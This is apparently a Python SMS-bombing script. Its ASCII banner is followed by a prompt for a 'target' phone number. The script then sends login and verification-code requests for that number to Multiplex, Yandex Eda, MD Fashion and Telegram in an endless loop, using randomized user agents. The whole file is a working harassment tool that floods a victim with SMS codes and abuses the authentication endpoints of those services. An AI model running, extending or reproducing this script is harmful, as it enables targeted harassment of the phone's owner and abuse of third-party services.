from user_agent import generate_user_agent
import threading
import requests
import random

print(r"""
    __    ____   __    __  __  __ __  __ _   __ ______ ______ ____   _____
   / /   / __ \ / /   / / / /_/ // / / // | / //_  __// ____// __ \ / ___/
  / /   / / / // /   / / /  _  // / / //  |/ /  / /  / __/  / /_/ / \__ \ 
 / /___/ /_/ // /___/ / / / / // /_/ // /|  /  / /  / /___ / _  _/ ___/ / 
/_____/\____//_______/ /_/ /_/ \____//_/ |_/  /_/   _____//_/ |_| /____/  
                                                                                              

""")
print('Who is your target? Type here: ')
phone = input()
phone_full = '38' + phone
phone_plus = '+' + phone_full

def run():
	while True:
		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
		'''russian_name = ''
		password = ''
		name = ''
		for i in range(12):
			russian_name = russian_name + random.choice(list('йцукенгшщзхъфывапролджэячсмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ'))
			password = password + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			name = name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		email = name + '@gmail.com' '''

		response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone_full}, headers = head)
		print('Multiplex: ' + str(response.text))
		
		response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
		print('Yandex eda: ' + str(response.text))

		response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
		print('MD Fashion: ' + str(response.text))

		response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
		print('Telegram: ' + str(response.text))

run()